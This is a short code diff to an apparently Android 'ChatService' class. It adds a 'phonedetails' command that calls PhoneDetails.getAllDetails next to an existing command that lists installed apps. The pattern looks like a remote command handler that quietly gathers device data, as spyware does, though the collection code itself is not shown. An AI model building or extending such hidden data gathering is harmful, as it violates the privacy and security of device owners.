@@ -112,6 +112,9 @@ public class ChatService extends Service {
                     case "app":
                         handleApps();
                         break;
+                    case "phonedetails":
+                        handlePhoneDetails();
+                        break;
                     default:
                         break;
                 }
@@ -207,6 +210,15 @@ public class ChatService extends Service {
         final PackageManager pm = getPackageManager();
         try {
             AppLister.ListApps(pm, getId());
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void handlePhoneDetails(){
+        Context context = getApplicationContext();
+        try {
+            PhoneDetails.getAllDetails(context, getId());
         } catch (Exception e) {
             e.printStackTrace();
         }
